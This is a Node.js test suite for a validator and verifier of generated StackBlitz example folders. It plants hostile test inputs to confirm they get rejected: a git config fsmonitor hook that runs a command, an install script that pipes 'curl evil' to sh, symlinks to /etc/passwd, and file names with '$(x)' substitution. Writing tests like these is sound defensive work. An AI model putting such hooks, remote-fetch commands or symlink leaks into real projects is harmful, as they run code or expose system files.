// Unit tests for validate-stackblitz-artifact.mjs (push-job gate) and the error paths of
// verify-stackblitz-examples.mjs (clean-room check).
// Run: node --test 'tooling/scripts/__tests__/*.test.mjs'   (headless, no network)
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { cp, mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, before, describe, test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { MANIFEST, generate } from '../build-stackblitz-examples.mjs';
import { ALLOWED_TOP_LEVEL, MAX_FILES, STAMP, parseArgs, validateArtifact } from '../validate-stackblitz-artifact.mjs';

const VALIDATOR = fileURLToPath(new URL('../validate-stackblitz-artifact.mjs', import.meta.url));
const VERIFY = fileURLToPath(new URL('../verify-stackblitz-examples.mjs', import.meta.url));
const SHA = '0123456789abcdef0123456789abcdef01234567';

const tmpRoots = [];
async function tmp(prefix) {
  const dir = await mkdtemp(join(tmpdir(), `fg-sba-${prefix}-`));
  tmpRoots.push(dir);
  return dir;
}
after(async () => {
  for (const d of tmpRoots) await rm(d, { recursive: true, force: true });
});

describe('validate-stackblitz-artifact', () => {
  let pristine;
  let versions;
  before(async () => {
    pristine = join(await tmp('gen'), 'out');
    ({ versions } = await generate({ out: pristine, sourceSha: SHA }));
  });

  /** A fresh copy of the real generator output, to mutate. */
  async function copy() {
    const dir = join(await tmp('copy'), 'art');
    await cp(pristine, dir, { recursive: true });
    return dir;
  }

  test('the real generator output passes, including the expected stamp', () => {
    assert.deepEqual(validateArtifact(pristine, { sha: SHA, ...versions }), []);
  });

  test('ALLOWED_TOP_LEVEL is exactly the generator MANIFEST folders + README.md + the stamp', () => {
    const expected = Object.fromEntries([...MANIFEST.map((e) => [e.dir, 'dir']), ['README.md', 'file'], [STAMP, 'file']]);
    assert.deepEqual(ALLOWED_TOP_LEVEL, expected);
  });

  test('a .git directory anywhere is rejected (planted git config)', async () => {
    const dir = await copy();
    await mkdir(join(dir, '.git'));
    await writeFile(join(dir, '.git', 'config'), '[core]\n\tfsmonitor = touch /tmp/pwned\n');
    await mkdir(join(dir, 'react', '.GIT'));
    const problems = validateArtifact(dir).join('\n');
    assert.match(problems, /^\.git: a \.git entry is never allowed/m);
    assert.match(problems, /react\/\.GIT: a \.git entry is never allowed/);
    assert.match(problems, /\.git: not an allowed top-level entry/);
  });

  test('a .git FILE (gitdir: pointer) is rejected too', async () => {
    const dir = await copy();
    await writeFile(join(dir, 'vue', '.git'), 'gitdir: /somewhere/else\n');
    assert.match(validateArtifact(dir).join('\n'), /vue\/\.git: a \.git entry is never allowed/);
  });

  test('symlinks are rejected, file or directory, at any depth', async () => {
    const dir = await copy();
    await symlink('/etc/passwd', join(dir, 'vanilla', 'src', 'leak.ts'));
    await symlink('..', join(dir, 'react', 'up'));
    const problems = validateArtifact(dir).join('\n');
    assert.match(problems, /vanilla\/src\/leak\.ts: symlink/);
    assert.match(problems, /react\/up: symlink/);
  });

  test('a symlinked top-level folder is rejected as the wrong kind', async () => {
    const dir = await copy();
    await rm(join(dir, 'headless'), { recursive: true });
    await symlink(join(dir, 'react'), join(dir, 'headless'));
    assert.match(validateArtifact(dir).join('\n'), /headless: expected a dir, found a symlink/);
  });

  test('special files (FIFO) are rejected', { skip: process.platform === 'win32' }, async () => {
    const dir = await copy();
    const res = spawnSync('mkfifo', [join(dir, 'vue', 'pipe')]);
    if (res.status !== 0) return; // no mkfifo on this host
    assert.match(validateArtifact(dir).join('\n'), /vue\/pipe: special file/);
  });

  test('hidden entries other than the top-level stamp are rejected (.gitattributes, nested stamp)', async () => {
    const dir = await copy();
    await writeFile(join(dir, '.gitattributes'), '* filter=x\n');
    await writeFile(join(dir, 'vanilla', '.gitignore'), 'src\n');
    await writeFile(join(dir, 'react', STAMP), '{}');
    const problems = validateArtifact(dir).join('\n');
    assert.match(problems, /^\.gitattributes: hidden entries are not allowed/m);
    assert.match(problems, /vanilla\/\.gitignore: hidden entries are not allowed/);
    assert.match(problems, /react\/\.stackblitz-stamp\.json: hidden entries are not allowed/);
  });

  test('unexpected and missing top-level entries', async () => {
    const dir = await copy();
    await writeFile(join(dir, 'install.sh'), 'curl evil | sh\n');
    await rm(join(dir, 'vue'), { recursive: true });
    const problems = validateArtifact(dir).join('\n');
    assert.match(problems, /install\.sh: not an allowed top-level entry/);
    assert.match(problems, /vue: missing/);
  });

  test('a top-level entry of the wrong kind', async () => {
    const dir = await copy();
    await rm(join(dir, 'README.md'));
    await mkdir(join(dir, 'README.md'));
    assert.match(validateArtifact(dir).join('\n'), /README\.md: expected a file, found a dir/);
  });

  test('names with control or shell characters are rejected', async () => {
    const dir = await copy();
    await writeFile(join(dir, 'react', 'a\nb.ts'), '');
    await writeFile(join(dir, 'react', '$(x).ts'), '');
    const problems = validateArtifact(dir).join('\n');
    assert.match(problems, /"react\/a\\nb\.ts": unexpected characters/);
    assert.match(problems, /"react\/\$\(x\)\.ts": unexpected characters/);
  });

  test('too many files', async () => {
    const dir = await copy();
    await mkdir(join(dir, 'vue', 'bulk'));
    for (let i = 0; i <= MAX_FILES; i += 1) await writeFile(join(dir, 'vue', 'bulk', `f${i}.txt`), '');
    assert.match(validateArtifact(dir).join('\n'), /files \(limit 500\)/);
  });

  test('stamp: invalid JSON, extra keys, malformed values, mismatch with what generate reported', async () => {
    const dir = await copy();
    await writeFile(join(dir, STAMP), '{nope');
    assert.match(validateArtifact(dir).join('\n'), /invalid JSON/);

    await writeFile(join(dir, STAMP), JSON.stringify({ sourceSha: 'HEAD', core: '1', react: '1.0.0', vue: '1.0.0', extra: 1 }));
    let problems = validateArtifact(dir).join('\n');
    assert.match(problems, /keys must be exactly/);
    assert.match(problems, /malformed sourceSha/);
    assert.match(problems, /malformed core version/);

    await writeFile(join(dir, STAMP), JSON.stringify({ sourceSha: SHA, ...versions }));
    problems = validateArtifact(dir, { sha: 'f'.repeat(40), core: '9.9.9' }).join('\n');
    assert.match(problems, /sourceSha is "0123.*", expected "ffff/);
    assert.match(problems, /core is ".*", expected "9\.9\.9"/);
  });

  test('a path that is not a directory, or does not exist', async () => {
    const dir = await tmp('notdir');
    await writeFile(join(dir, 'file'), '');
    assert.match(validateArtifact(join(dir, 'file'))[0], /expected a directory, found a file/);
    assert.match(validateArtifact(join(dir, 'missing'))[0], /ENOENT/);
  });

  test('parseArgs and CLI exit codes', async () => {
    assert.deepEqual(parseArgs(['d', '--expect-core', '1.0.0']), { dir: 'd', expect: { core: '1.0.0' } });
    assert.throws(() => parseArgs([]), /usage/);
    assert.throws(() => parseArgs(['d', '--expect-vue']), /needs a value/);
    assert.throws(() => parseArgs(['d', 'e']), /unknown argument/);

    const ok = spawnSync(process.execPath, [VALIDATOR, pristine, '--expect-sha', SHA], { encoding: 'utf8' });
    assert.equal(ok.status, 0, ok.stderr);
    const dir = await copy();
    await symlink('/', join(dir, 'vanilla', 'root'));
    const bad = spawnSync(process.execPath, [VALIDATOR, dir], { encoding: 'utf8' });
    assert.equal(bad.status, 1);
    assert.match(bad.stderr, /vanilla\/root: symlink/);
  });
});

describe('verify-stackblitz-examples error paths (no network: zero-dependency fake examples)', () => {
  const run = (args) => spawnSync(process.execPath, [VERIFY, ...args], { encoding: 'utf8', timeout: 120_000 });

  /** A fake generator output containing only `dir` with the given package.json and files. */
  async function fakeOutput(dir, pkg, files = {}) {
    const out = join(await tmp('fake'), 'out');
    await mkdir(join(out, dir), { recursive: true });
    await writeFile(join(out, STAMP), '{}');
    await writeFile(join(out, dir, 'package.json'), JSON.stringify({ name: `fake-${dir}`, version: '0.0.0', private: true, ...pkg }));
    for (const [name, content] of Object.entries(files)) await writeFile(join(out, dir, name), content);
    return out;
  }
  const freshWork = async () => join(await tmp('work'), 'w');

  test('refuses a directory that is not a generator output', async () => {
    const res = run([await tmp('empty'), '--work', await freshWork()]);
    assert.equal(res.status, 1);
    assert.match(res.stderr, /is not a build-stackblitz-examples output \(no \.stackblitz-stamp\.json\)/);
  });

  test('refuses a non-empty --work', async () => {
    const out = await fakeOutput('headless', {});
    const work = await tmp('busy');
    await writeFile(join(work, 'x'), '');
    const res = run([out, '--work', work]);
    assert.equal(res.status, 1);
    assert.match(res.stderr, /must be empty/);
  });

  test('refuses a --work inside an npm project (an enclosing package.json would capture the install)', async () => {
    const out = await fakeOutput('headless', {});
    const project = await tmp('project');
    await writeFile(join(project, 'package.json'), '{}');
    const res = run([out, '--work', join(project, 'nested', 'work')]);
    assert.equal(res.status, 1);
    assert.match(res.stderr, /package\.json encloses/);
  });

  test('fails when the build leaves a page out of dist/', async () => {
    const out = await fakeOutput('vanilla', { scripts: { build: 'node -e "require(\'fs\').mkdirSync(\'dist\')"' } }, { 'index.html': '<!doctype html>' });
    const res = run([out, '--work', await freshWork(), '--only', 'vanilla']);
    assert.equal(res.status, 1, res.stderr);
    assert.match(res.stderr, /vanilla: dist is missing index\.html/);
  });

  test('passes when every page is in dist/', async () => {
    const build = 'node -e "const f=require(\'fs\');f.mkdirSync(\'dist\');f.writeFileSync(\'dist/index.html\',\'\')"';
    const out = await fakeOutput('vanilla', { scripts: { build } }, { 'index.html': '<!doctype html>' });
    const res = run([out, '--work', await freshWork(), '--only', 'vanilla']);
    assert.equal(res.status, 0, res.stderr);
    assert.match(res.stdout, /vanilla: install \+ build ok \(1 page\(s\)\)/);
  });

  test('fails when headless `npm start` prints no critical path', async () => {
    const out = await fakeOutput('headless', { scripts: { start: 'node -e "console.log(\'hello\')"' } });
    const res = run([out, '--work', await freshWork(), '--only', 'headless']);
    assert.equal(res.status, 1);
    assert.match(res.stderr, /headless: `npm start` printed no critical path/);
  });

  test('fails when an example has neither a build nor a start script', async () => {
    const out = await fakeOutput('react', { scripts: {} });
    const res = run([out, '--work', await freshWork(), '--only', 'react']);
    assert.equal(res.status, 1);
    assert.match(res.stderr, /react: has neither a build nor a start script/);
  });

  test('fails when --only matches nothing', async () => {
    const out = await fakeOutput('react', {});
    const res = run([out, '--work', await freshWork(), '--only', 'svelte']);
    assert.equal(res.status, 1);
    assert.match(res.stderr, /no example matched --only svelte/);
  });
});
